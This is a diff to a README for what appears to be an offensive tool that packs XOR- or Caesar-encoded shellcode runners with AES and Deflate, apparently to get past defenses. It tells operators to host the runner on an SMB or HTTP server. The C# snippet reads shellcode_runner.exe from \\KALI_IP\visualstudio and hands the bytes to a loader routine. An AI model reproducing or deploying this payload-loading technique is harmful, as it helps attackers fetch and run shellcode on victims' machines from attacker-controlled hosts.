@@ -357,13 +357,14 @@ There are two templates that encrypt a shellcode runner using AES + Compression 
 - AES_Deflate_HTTP.cs
 - AES_Deflate_SMB.cs
 
-To successfully launch this type of attack, you need first to copy the preferred shellcode runner ```XOR``` or ```Caesar``` to an SMB or HTTP server and rename it as ```shellcode_runner.exe```. The default SMB name, it is called **visualstudio**, however you can edited as you wish and provide the one that you already have. Just remember to modify the **line 124** of the template ```Templates/AES/AES_Deflate_SMB.cs``` 
+To successfully launch this type of attack, you need first to copy the preferred shellcode runner ```XOR``` or ```Caesar``` to an SMB or HTTP server and rename it as ```shellcode_runner.exe```. The default SMB name, it is called **visualstudio**, however you can edited as you wish and provide the one that you already have. Just remember to modify the **line 123** of the template ```Templates/AES/AES_Deflate_SMB.cs``` 
 
 ```
 ...
     public static void Main(string[] args)
     {
-        ruleThemAll("\\\\KALI_IP\\visualstudio\\shellcode_runner.exe");
+        byte[] contents = File.ReadAllBytes("\\\\KALI_IP\\visualstudio\\shellcode_runner.exe");
+        ruleThemAll(contents);
         
     }
 ...        
